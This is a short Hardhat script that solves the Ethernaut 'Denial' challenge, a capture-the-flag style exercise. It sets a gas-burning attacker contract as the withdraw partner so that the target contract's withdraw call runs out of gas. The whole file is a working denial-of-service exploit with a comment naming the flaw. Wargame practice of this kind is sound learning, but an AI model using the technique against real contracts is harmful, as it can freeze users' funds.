import { ethers } from "hardhat";

const attackDenial = async () => {
    // change contract addresses here.
    const denialAddress = "0x2B7E4a3d6B6c099f5d4e50efED9a31caa5a6B19f";
    const attackDenialGasBurnerAddress = "0x48EE54343a470621D4060E57D2eEC36ab86F6492";

    // Don't touch below
    // Exploit comes from no check withdraw function withno mitigation from attack through execution of some unknown external contract code through call method.
    // You may read more on:
    // https://solidity-by-example.org/sending-ether/
    // https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties
    const ABI = ["function setWithdrawPartner(address _partner)"];
    const contract = await ethers.getContractAt(ABI, denialAddress);
    const tx1 = await contract.setWithdrawPartner(attackDenialGasBurnerAddress);
    console.log("Attack done...you may submit on ethernaut");
};

attackDenial()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
